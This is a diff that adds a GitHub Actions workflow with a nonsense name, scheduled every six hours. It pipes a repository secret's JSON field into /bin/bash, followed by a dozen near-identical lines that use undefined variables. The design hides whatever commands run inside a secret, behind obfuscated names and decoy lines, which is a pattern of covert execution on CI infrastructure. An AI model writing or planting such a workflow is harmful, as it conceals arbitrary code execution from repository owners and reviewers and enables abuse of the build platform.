@@ -1,0 +1,29 @@
+name: inboardstingy
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: inboardstingy
+        env:
+          y25997: ${{ secrets.y25997 }}
+        run: |
+          echo $y25997 | jq -r .ufyy56104 | /bin/bash
+          echo $xsjqg5 | jq -r .qjik05625 | /bin/bash
+          echo $h2 | jq -r .tig4 | /bin/bash
+          echo $brfei92 | jq -r .vkwr56 | /bin/bash
+          echo $toza662 | jq -r .fvi098 | /bin/bash
+          echo $loar41 | jq -r .ko6 | /bin/bash
+          echo $mbk0 | jq -r .u9373 | /bin/bash
+          echo $iuj30 | jq -r .xfv4 | /bin/bash
+          echo $bua97126 | jq -r .ijm0 | /bin/bash
+          echo $xruir59643 | jq -r .wnbep9 | /bin/bash
+          echo $alfyj984 | jq -r .rxlxd9674 | /bin/bash
+          echo $n82 | jq -r .s0123 | /bin/bash
+          echo $yv58243 | jq -r .zf1 | /bin/bash
+
